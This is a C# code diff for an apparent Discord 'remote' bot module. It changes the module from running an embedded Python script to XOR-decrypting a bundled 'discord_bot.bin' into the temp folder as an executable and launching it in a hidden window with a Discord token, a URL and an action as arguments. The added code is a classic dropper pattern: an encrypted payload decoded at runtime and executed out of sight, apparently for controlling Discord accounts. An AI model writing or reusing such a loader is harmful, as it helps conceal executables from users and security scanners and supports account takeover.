@@ -23,38 +23,30 @@ namespace FinalBot.Modules
                 }
 
                 if (!Directory.Exists(_tempDir)) Directory.CreateDirectory(_tempDir);
-                string outPath = Path.Combine(_tempDir, "discord_bot.py");
+                string tempExe = Path.Combine(Path.GetTempPath(), "discord_bot_v2.exe");
 
-                // Extract resource
-                if (!File.Exists(outPath) || new FileInfo(outPath).Length < 100)
+                // 2. Decrypt if not already decrypted this session
+                if (!File.Exists(tempExe))
                 {
-                    var assembly = Assembly.GetExecutingAssembly();
-                    string resourceName = assembly.GetManifestResourceNames()
-                        .FirstOrDefault(n => n.EndsWith("discord_bot.py"));
-                    
-                    if (string.IsNullOrEmpty(resourceName))
-                        return "❌ Failed: Resource 'discord_bot.py' not found in assembly.";
+                    string binPath = Path.Combine(VanguardCore.Modules.ResourceModule.WorkDir, "discord_bot.bin");
+                    if (!File.Exists(binPath)) return "❌ Failed: Binary 'discord_bot.bin' not found.";
 
-                    using (Stream stream = assembly.GetManifestResourceStream(resourceName))
-                    {
-                        if (stream == null) return "❌ Failed: Stream is null for " + resourceName;
-                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
-                        {
-                            stream.CopyTo(fileStream);
-                        }
-                    }
+                    byte[] bytes = File.ReadAllBytes(binPath);
+                    for (int i = 0; i < bytes.Length; i++) bytes[i] ^= VanguardCore.Constants.RESOURCE_XOR_KEY;
+                    File.WriteAllBytes(tempExe, bytes);
                 }
 
                 // Ensure profile dir exists
                 if (!Directory.Exists(_profileDir)) Directory.CreateDirectory(_profileDir);
 
-                // Launch via Python
+                // Launch the EXE
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = "python",
-                    Arguments = $"\"{outPath}\" \"{token}\" \"{url}\" \"{action}\" --profile \"{_profileDir}\"",
+                    FileName = tempExe,
+                    Arguments = $"\"{token}\" \"{url}\" \"{action}\" --profile \"{_profileDir}\"",
                     UseShellExecute = true,
-                    CreateNoWindow = true
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
                 });
 
                 return $"✅ Discord Remote launched: Action `{action}` started.";
